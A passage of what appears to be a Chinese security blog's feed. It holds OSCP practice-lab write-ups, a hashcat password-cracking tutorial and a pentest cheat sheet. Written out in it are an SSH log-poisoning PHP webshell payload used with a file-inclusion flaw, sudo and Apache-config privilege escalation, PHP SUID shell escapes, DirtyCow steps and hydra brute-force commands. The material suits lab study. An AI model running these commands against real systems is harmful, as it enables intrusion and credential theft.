pk tanto@192.168.203.90 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure><p>在seppuku的目录下发现.passwd文件，里面是12345685213456!@!@A，猜测可以用这个登录最后一个用户samurai</p><p>发现可以执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br></pre></td></tr></table></figure><p>但是&#x2F;home&#x2F;tanto&#x2F;下没有.cgi_bin目录，我们创建一个（切换到tanto用户去创建）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir .cgi_bin</span><br><span class="line">cd .cgi_bin/</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; bin</span><br><span class="line">chmod 777 bin #这里一定要改权限，不然samurai无权执行</span><br></pre></td></tr></table></figure><p>然后切换到tanto用户，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br></pre></td></tr></table></figure><p>拿到root</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Ha-natraj</title>
      <link href="/2024/04/20/OSCPLab-Ha-natraj/"/>
      <url>/2024/04/20/OSCPLab-Ha-natraj/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)</span><br><span class="line">|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)</span><br><span class="line">|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: HA:Natraj</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), Linux 4.9 (90%), Linux 4.0 (88%), Linux 2.6.18 (87%), Linux 3.10 - 4.11 (87%), Linux 3.11 - 4.1 (87%), Linux 3.18 (87%), Linux 3.2 - 4.9 (87%), Linux 5.1 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>目录扫描，发现<a href="http://192.168.237.80/console/%E7%9B%AE%E5%BD%95%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89file.php">http://192.168.237.80/console/目录，里面有file.php</a></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><a href="http://192.168.237.80/console/file.php%E6%9C%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%99%E9%87%8C%E7%9B%B4%E6%8E%A5%E7%9C%8B%E7%9A%84hint%EF%BC%89">http://192.168.237.80/console/file.php有文件包含漏洞（这里直接看的hint）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.237.80/console/file.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>然后拿到了natraj 和 mahakal两个用户名，尝试SSH爆破无果</p><p>然后尝试去读取两个用户目录下的id_rsa文件，也失败了</p><p>尝试去读取机器上的登录日志文件，Linux上的登录日志文件在&#x2F;var&#x2F;log&#x2F;auth.log</p><p>后面就是使用LFI 和 SSH 登录日志文件达到RCE的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27;@192.168.237.80</span><br></pre></td></tr></table></figure><p>这里有个问题，就是SSH在升级之后是不允许使用此类用户名，只能用msf里的auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login，设置用户名和密码，密码随意，然后run</p><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.212.80/console/file.php?file=/var/log/auth.log&amp;&amp;cmd=id</span><br></pre></td></tr></table></figure><p>上php马，拿到shell</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>运行sudo -l</p><p>发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl start apache2</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl stop apache2</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl restart apache2</span><br></pre></td></tr></table></figure><p>然后找到apache的配置文件, 当前用户www-data对apache2.conf有修改权限</p><p>apche2.conf文件中的如下配置是设置apache是以什么用户的权限运行起来的，也就是说，如果是以root权限起的apache，那么反弹的shell就是root权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User $&#123;APACHE_RUN_USER&#125;</span><br><span class="line">Group $&#123;APACHE_RUN_GROUP&#125;</span><br></pre></td></tr></table></figure><p>实测这里不能改成root，可以改成mahakal</p><p>靶机上进入&#x2F;tmp目录，从攻击机下载修改后的apache2.conf，并复制到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ wget http://192.168.101.34/apache2.conf</span><br><span class="line">www-data@ubuntu:/tmp$ cp /tmp/apache2.conf /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User mahakal</span><br><span class="line">Group mahakal</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/systemctl restart apache2</span><br></pre></td></tr></table></figure><p>然后重新反弹shell，拿到mahakal权限</p><p>查看sudo -l</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User mahakal may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure><p>然后拿到root权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hashcat破解shadow文件</title>
      <link href="/2024/04/17/%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3shadow%E6%96%87%E4%BB%B6/"/>
      <url>/2024/04/17/%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3shadow%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>在 Linux 系统中，<code>/etc/shadow</code> 是一个存储着用户加密密码和其他相关信息的文件。而 <code>$y$</code> 则是指密码的加密算法类型，也就是哈希函数的标识符。</p><p>在 <code>/etc/shadow</code> 文件中，每个用户的密码都是用一个特定的哈希函数加密的。为了避免密码被轻易破解，Linux 系统会使用不同的哈希函数来加密密码。而 <code>$y$</code> 中的 <code>y</code> 字符则表示使用的是哪种哈希函数，不同的哈希函数对应不同的字符。</p><p>以下是一些常见的 <code>$y$</code> 值及其对应的哈希函数：</p><ul><li><code>$1$</code> 表示使用的是 MD5 哈希函数；</li><li><code>$2$</code> 或 <code>$2a$</code> 表示使用的是 Blowfish 哈希函数；</li><li><code>$5$</code> 表示使用的是 SHA-256 哈希函数；</li><li><code>$6$</code> 表示使用的是 SHA-512 哈希函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.:18443:0:99999:7:::</span><br><span class="line"></span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure><p>其他字段都较好理解，其中加密密码和最后一次修改时间需要解释一下：</p><p>加密密码中如果第一个字符为!或者*的话，说明这是一个不能登录的账户，其他情况格式为$id$salt$encrypted</p><p>根据id可以判断加密方式，第二个$到第三个$之间的字段为salt，第三个$之后的字段为密码hash。</p><p>了解了linux系统密码保存的情况，就可以提取出来使用hashcat破解，我们需要提取第二个冒号到第三个冒号之间的字段保存到一个文件root.txt中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 -a 0 -o result.txt root.txt top100.txt --force</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>掩码破解windows用户密码，查看windows hash的工具非常多，为了省事我直接使用前面文章介绍过的工具LaZagne 就不重复介绍新工具了 <a href="http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/">http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p><p>提取到windows hash如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test:1005:aad3b435b51404eeaad3b435b51404ee:f9e37e83b83c47a93c2f09f66408631b:::</span><br><span class="line"></span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>我们需要提取后方的NT-HASH用来破解，即f9e37e83b83c47a93c2f09f66408631b存入test.txt，由于我设置的是三位字母三位数字的密码，使用如下掩码进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 -a 3 -o result4.txt test.txt ?l?l?l?d?d?d --force</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透常用命令及思路（持续更新）</title>
      <link href="/2024/04/17/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%80%9D%E8%B7%AF/"/>
      <url>/2024/04/17/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口扫描，多跑几次</span></span><br><span class="line">sudo nmap --min-rate 10000 -p- 192.168.220.118</span><br><span class="line">sudo nmap -p22,80 -sV -A sandbox.local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目录扫描</span></span><br><span class="line">dirsearch -u http://192.168.212.89 -f -e php,txt,html,zip,rar,tar.gz,tar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">dirsearch -u http://192.168.237.80 -f -e php,txt,html,zip,rar,tar.gz,tar -w /usr/share/dirb/wordlists/common.txt</span><br><span class="line">gobuster dir -u http://192.168.178.80 -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line">dirsearch -u http://172.16.33.62:7601/ -x 403</span><br><span class="line">dirb http://10.0.2.5/cgi-bin /usr/share/wordlists/dirb/big.txt</span><br><span class="line">gobuster dir -u http://192.168.178.80 -x html,php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描.zip文件</span></span><br><span class="line">gobuster dir -u http://192.168.1.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Fuzz参数</span></span><br><span class="line">ffuf -u &#x27;http://192.168.179.80:80/console/file.php?FUZZ=/etc/passwd&#x27; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 0</span><br></pre></td></tr></table></figure><h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># wpscan</span><br><span class="line">只能扫首页，不是登录页面</span><br><span class="line">wpscan --url http://blogger.thm/assets/fonts/blog/ --enumerate p --plugins-detection aggressive</span><br></pre></td></tr></table></figure><p>扫出来的结果看版本、看插件</p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爆破MySQL</span></span><br><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.220.118 mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra 爆破登录框,POST请求爆破,F=后面是页面登录失败返回的错误信息，需要手动改</span></span><br><span class="line">hydra -L mail.txt -P ~/Desktop/rockyou.txt 10.0.2.47 -s 8000 http-post-form &quot;/api.php?/sessions:email=^USER^&amp;password=^PASS^:F=Incorrect. Try again or reset your password.&quot; -V -F -u</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra 爆破ssh，参数的大小写是有区别的</span></span><br><span class="line">hydra -L 用户名文件 -p 指定密码 -f $IP ssh</span><br><span class="line">hydra -l 指定用户名 -p 指定密码 -f $IP ssh</span><br><span class="line">hydra -l 指定用户名 -P 指定密码文件 -f $IP ssh</span><br></pre></td></tr></table></figure><h2 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h2><h3 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h3><p>1.运行sudo -l，查看sudo权限的命令</p><p>2.查找suid权限文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>3.查找具有cap权限的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>4.查找内核</p><p>5.利用lxd&#x2F;lxc提权，执行id的时候发现用户属于lxd组</p><p>6.查看当前目录下有没有.history之类的文件，有的话，试一下密码重用能不能打</p><h3 id="其他的方法或者注意事项"><a href="#其他的方法或者注意事项" class="headerlink" title="其他的方法或者注意事项"></a>其他的方法或者注意事项</h3><h4 id="php的suid提权"><a href="#php的suid提权" class="headerlink" title="php的suid提权"></a>php的suid提权</h4><p>php的suid提权，假设发现了&#x2F;usr&#x2F;bin&#x2F;php7.2文件，直接运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/php7.2 -r “pcntl_exec(‘/bin/sh’, [‘-p’]);”</span><br></pre></td></tr></table></figure><p>如果不成功，运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.2 -r “pcntl_exec(‘/bin/sh’, [‘-p’]);”</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r “pcntl_exec(‘/bin/sh’, [‘-p’]);”</span><br></pre></td></tr></table></figure><h4 id="DirtyCow提权"><a href="#DirtyCow提权" class="headerlink" title="DirtyCow提权"></a>DirtyCow提权</h4><p>脏牛提权4.4.0-31-generic，exp位于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/40847.cpp</span><br></pre></td></tr></table></figure><p>将CPP下载到目标主机，然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow -s</span><br></pre></td></tr></table></figure><p>一定要先转成交互式shell再执行，不然失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;;</span><br></pre></td></tr></table></figure><p>第二个脏牛的exp</p><p><a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p>一定要在目标机器上编译运行</p><p>有的是C语言，gcc编译，有的是cpp，g++编译</p><h4 id="getcap提权"><a href="#getcap提权" class="headerlink" title="getcap提权"></a>getcap提权</h4><p>getcap返回tar命令的提权方法（&#x2F;home目录下有tar文件）<br>举个例子，getcap返回的是&#x2F;home&#x2F;cyber&#x2F;tar cap_dac_read_search&#x3D;ep，意味着&#x2F;home&#x2F;cyber&#x2F;tar有cap权限，那么就可以执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf shadow.tar /etc/shadow</span><br><span class="line">./tar -xvf shadow.tar</span><br></pre></td></tr></table></figure><p>.&#x2F;意思是用当前目录下的tar文件，不加.&#x2F;意思就是用系统的tar，因为题目给的tar文件有执行权限，所以要用题目给的tar打包,再查看解压的文件，这里是查看shadow文件，想查看哪个目录就把哪个目录下的文件打包再解压就行了</p><h4 id="apache配置文件提权"><a href="#apache配置文件提权" class="headerlink" title="apache配置文件提权"></a>apache配置文件提权</h4><p>运行sudo -l，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl start apache2</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl stop apache2</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl restart apache2</span><br></pre></td></tr></table></figure><p>然后找到apache的配置文件, 当前用户www-data对apache2.conf有修改权限</p><p>apche2.conf文件中的如下配置是设置apache是以什么用户的权限运行起来的，也就是说，如果是以root权限起的apache，那么反弹的shell就是root权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User $&#123;APACHE_RUN_USER&#125;</span><br><span class="line">Group $&#123;APACHE_RUN_GROUP&#125;</span><br></pre></td></tr></table></figure><p>假设可以改成mahakal（也可以试一下root）</p><p>靶机上进入&#x2F;tmp目录，从攻击机下载修改后的apache2.conf，并复制到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ wget http://192.168.101.34/apache2.conf</span><br><span class="line">www-data@ubuntu:/tmp$ cp /tmp/apache2.conf /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User mahakal</span><br><span class="line">Group mahakal</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/systemctl restart apache2</span><br></pre></td></tr></table></figure><p>然后重新反弹shell，拿到mahakal权限</p><h4 id="其他的方法"><a href="#其他的方法" class="headerlink" title="其他的方法"></a>其他的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">看/home目录，有么有别的用户，如果有，看文件，如果没文件，看.ssh目录下的authorized_keys文件有没有公钥信息，比如当前a用户登录的系统，b用户下的.ssh目录中有a用户的公钥信息，如下</span><br><span class="line">ssh-rsa AAAAB3xxxXEB9F3 a@debian</span><br><span class="line">意味着a可以直接运行ssh b@127.0.0.1切换到b用户</span><br><span class="line"></span><br><span class="line">2.记得是运行ls -al查看所有用户，如果sudo的权限没有对应文件，记得看一下是不是可以创建对应的文件，比如</span><br><span class="line">查看seppuku的sudo权限没有找到利用方法，换个账户登ssh，查看/home目录发现tanto用户，也没有可利用的，在seppuku的目录下发现.passwd文件，里面是12345685213456!@!@A，猜测可以用这个登录最后一个用户samurai，发现可以执行</span><br><span class="line">(ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br><span class="line">但是/home/tanto/下没有.cgi_bin目录，我们创建一个（切换到tanto用户去创建）</span><br><span class="line">```</span><br><span class="line">mkdir .cgi_bin</span><br><span class="line">cd .cgi_bin/</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; bin</span><br><span class="line">chmod 777 bin #这里一定要改权限，不然samurai无权执行</span><br><span class="line">```</span><br><span class="line">然后切换到tanto用户，执行</span><br><span class="line">```</span><br><span class="line">sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br><span class="line">```</span><br><span class="line">拿到root</span><br><span class="line"></span><br><span class="line">3.使用pypy去查看进程</span><br><span class="line"></span><br><span class="line">4.get cap的命令去查了之后要分析怎么跑，不要直接套用</span><br></pre></td></tr></table></figure><h2 id="SMB-Service"><a href="#SMB-Service" class="headerlink" title="SMB Service"></a>SMB Service</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.222.11 # 匿名登录smb</span><br><span class="line">smbmap -H 192.168.222.11</span><br><span class="line">smbclient //192.168.222.11/IPC$ # 匿名查看共享目录</span><br><span class="line">遇到SMB服务一定记得试一下能不能put上传文件</span><br><span class="line">enum4linux -a 192.168.0.109 # 枚举用户等各种信息，在拿不到用户名的时候可以尝试</span><br></pre></td></tr></table></figure><h2 id="字符串加解密相关"><a href="#字符串加解密相关" class="headerlink" title="字符串加解密相关"></a>字符串加解密相关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line">这种叫Brainfuck/Ook! decode</span><br></pre></td></tr></table></figure><h2 id="压缩包破解"><a href="#压缩包破解" class="headerlink" title="压缩包破解"></a>压缩包破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john tom.zip &gt;&gt; has1.txt</span><br><span class="line">john has1.txt #会输出压缩包密码</span><br></pre></td></tr></table></figure><h2 id="Web拿权限"><a href="#Web拿权限" class="headerlink" title="Web拿权限"></a>Web拿权限</h2><h3 id="文件包含漏洞结合访问日志达到RCE"><a href="#文件包含漏洞结合访问日志达到RCE" class="headerlink" title="文件包含漏洞结合访问日志达到RCE"></a>文件包含漏洞结合访问日志达到RCE</h3><p>假设有个LFI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.237.80/console/file.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>然后拿到了natraj 和 mahakal两个用户名，尝试SSH爆破无果</p><p>然后尝试去读取两个用户目录下的id_rsa文件，也失败了</p><p>尝试去读取机器上的登录日志文件，Linux上的登录日志文件在&#x2F;var&#x2F;log&#x2F;auth.log</p><p>后面就是使用LFI 和 SSH 登录日志文件达到RCE的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27;@192.168.237.80</span><br></pre></td></tr></table></figure><p>这里有个问题，就是SSH在升级之后是不允许使用此类用户名，只能用msf里的auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login，设置用户名和密码，密码随意，然后run</p><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 